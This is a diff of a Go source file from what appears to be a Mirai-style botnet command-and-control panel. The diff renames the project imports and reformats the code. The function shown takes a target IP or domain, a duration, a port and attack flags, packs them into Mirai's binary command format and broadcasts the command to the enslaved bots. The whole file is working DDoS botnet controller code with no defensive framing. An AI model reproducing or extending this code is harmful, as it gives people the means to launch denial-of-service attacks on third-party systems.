@@ -1,10 +1,10 @@
 package attacks
 
 import (
-	"Nosviak2/core/clients/sessions"
-	"Nosviak2/core/configs"
-	"Nosviak2/core/slaves/mirai"
-	"Nosviak2/core/sources/language"
+	"Morphine/core/clients/sessions"
+	deployment "Morphine/core/configs"
+	"Morphine/core/slaves/mirai"
+	"Morphine/core/sources/language"
 	"encoding/binary"
 	"errors"
 	"net"
@@ -12,8 +12,8 @@ import (
 	"strings"
 )
 
-//properly tries to launch the mirai attack
-//this will broadcast the information within the network without issues
+// properly tries to launch the mirai attack
+// this will broadcast the information within the network without issues
 func NewMiraiAttack(target string, duration int, port int, method *Method, session *sessions.Session, flags map[string]*KeyValue) (bool, error) {
 
 	//stores all of our targets safely
@@ -37,7 +37,7 @@ func NewMiraiAttack(target string, duration int, port int, method *Method, sessi
 			if session == nil { //checks if we are funneling into the api tunnel
 				return false, errors.New("you have provided an invalid target within the system")
 			} //defaults properly without issues happening
-			return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target":target})
+			return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target": target})
 		}
 
 		if IsDomain(target) {
@@ -46,21 +46,20 @@ func NewMiraiAttack(target string, duration int, port int, method *Method, sessi
 				if session == nil { //checks if we are funneling into the api tunnel
 					return false, errors.New("you have provided an invalid target within the system")
 				} //defaults properly without issues happening
-				return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target":target})
+				return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target": target})
 			}
 
 			target = string(sysTarg[0].String())
 		}
 
-
 		//tries to parse the target safely
 		//this will ensure its done without any errors happening
 		ip := net.ParseIP(target) //tries to parse the target without issues
-		if ip == nil { //checks to see if it was successful without any errors
+		if ip == nil {            //checks to see if it was successful without any errors
 			if session == nil { //checks if we are funneling into the api tunnel
 				return false, errors.New("you have provided an invalid target within the system")
 			} //defaults properly without issues happening
-			return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target":target})
+			return false, language.ExecuteLanguage([]string{"attacks", "mirai", "invalid-target.itl"}, session.Channel, deployment.Engine, session, map[string]string{"target": target})
 		}
 
 		//saves into the array properly safely
@@ -68,11 +67,10 @@ func NewMiraiAttack(target string, duration int, port int, method *Method, sessi
 		targets[binary.BigEndian.Uint32(ip[12:])] = 32
 	}
 
-
 	//stores our proper output without issues
 	//this will be what we broadcast via our clients
 	Buffer := make([]byte, 0) //our attack output properly
-	var cacheBuf []byte //this will act as our temp buffer
+	var cacheBuf []byte       //this will act as our temp buffer
 
 	cacheBuf = make([]byte, 4) //duration cache
 	//parses and formats the attack duration safely
@@ -93,10 +91,10 @@ func NewMiraiAttack(target string, duration int, port int, method *Method, sessi
 	for prefix, netmask := range targets { //ranges through properly
 		//resets the cache properly and safely
 		//this will ensure its done without any errors
-		cacheBuf = make([]byte, 5) //resets buffer properly
+		cacheBuf = make([]byte, 5)                   //resets buffer properly
 		binary.BigEndian.PutUint32(cacheBuf, prefix) //puts properly
-		cacheBuf[4] = byte(netmask) //saves in properly within the netmask
-		Buffer = append(Buffer, cacheBuf...) //forwads properly without issues
+		cacheBuf[4] = byte(netmask)                  //saves in properly within the netmask
+		Buffer = append(Buffer, cacheBuf...)         //forwads properly without issues
 	}
 
 	//stores our length properly
@@ -122,20 +120,20 @@ func NewMiraiAttack(target string, duration int, port int, method *Method, sessi
 		if value.ID == method.MiraiPortInterface {
 			hasPort = true //flips properly and safely
 		}
-		cacheBuf = make([]byte, 2) //sets the buffer properly
-		cacheBuf[0] = uint8(value.ID) //flag id information
-		cacheBuf[1] = uint8(len(value.Value)) //values value information
+		cacheBuf = make([]byte, 2)                          //sets the buffer properly
+		cacheBuf[0] = uint8(value.ID)                       //flag id information
+		cacheBuf[1] = uint8(len(value.Value))               //values value information
 		cacheBuf = append(cacheBuf, []byte(value.Value)...) //savesin properly
-		Buffer = append(Buffer, cacheBuf...) //saves into the buffer properly
+		Buffer = append(Buffer, cacheBuf...)                //saves into the buffer properly
 	}
 
 	//checks for the port properly
 	if !hasPort { //syncs with port
 		//adds support for port system
 		//this will ensure its added into the command
-		cacheBuf = make([]byte, 2) //sets the buffer properly
+		cacheBuf = make([]byte, 2)                     //sets the buffer properly
 		cacheBuf[0] = uint8(method.MiraiPortInterface) //miraiPortID
-		cacheBuf[1] = uint8(len(strconv.Itoa(port))) //ports length
+		cacheBuf[1] = uint8(len(strconv.Itoa(port)))   //ports length
 		cacheBuf = append(cacheBuf, []byte(strconv.Itoa(port))...)
 		Buffer = append(Buffer, cacheBuf...) //saves into the buffer properly
 	}
@@ -152,7 +150,7 @@ func NewMiraiAttack(target string, duration int, port int, method *Method, sessi
 	cacheBuf = make([]byte, 2) //resets properly
 	//sends the amount of the buffer properly safely
 	//this will ensure its done without any errors happening
-	binary.BigEndian.PutUint16(cacheBuf, uint16(len(Buffer) + 2))
+	binary.BigEndian.PutUint16(cacheBuf, uint16(len(Buffer)+2))
 	Buffer = append(cacheBuf, Buffer...) //adds into the main array properly
 
 	//broadcasts the command across all slaves
@@ -160,7 +158,7 @@ func NewMiraiAttack(target string, duration int, port int, method *Method, sessi
 	return true, mirai.Send(Buffer, session) //broadcasts properly
 }
 
-//checks if the flags contain the dport flag or the method flag
+// checks if the flags contain the dport flag or the method flag
 func hasPort(m *Method, flags map[string]*KeyValue) bool { //boolean returned
 	//ranges through the flags properly
 	//this will ensure its done properly
@@ -168,5 +166,6 @@ func hasPort(m *Method, flags map[string]*KeyValue) bool { //boolean returned
 		if flag.ID == m.MiraiPortInterface { //checks
 			return true //returns true properly
 		}
-	}; return false
+	}
+	return false
 }
